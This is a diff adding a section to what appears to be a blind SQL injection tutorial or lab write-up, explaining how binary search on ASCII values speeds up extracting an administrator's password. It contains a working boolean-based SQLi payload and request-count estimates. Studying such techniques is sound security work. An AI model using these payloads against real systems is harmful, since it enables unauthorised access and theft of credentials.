@@ -494,6 +494,25 @@ if __name__ == "__main__":
 [◒] SQLi Payload: qCVrRO8js6JMBwOm' AND (SELECT SUBSTRING(password,1,1)...
 [+] Password: *******
 ```
+### Binary Search Optimization
+
+Rather than testing each character sequentially (O(n) per position), binary search reduces complexity to O(log n):
+
+```sql
+-- Instead of: is char = 'a'? is char = 'b'? is char = 'c'?
+-- Ask: is char > 'm'?
+
+' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='administrator') > 109-- -
+```
+
+The ASCII function converts a character to its numeric value, enabling greater-than/less-than comparisons. For a 36-character alphabet:
+
+- **Sequential search:** Average 18 requests per character
+- **Binary search:** Maximum 6 requests per character (log₂(36) ≈ 5.17)
+
+For a 20-character password:
+- **Sequential:** ~360 requests
+- **Binary search:** ~120 requests (3x faster)
 
 ### Conditional Response Variations
 
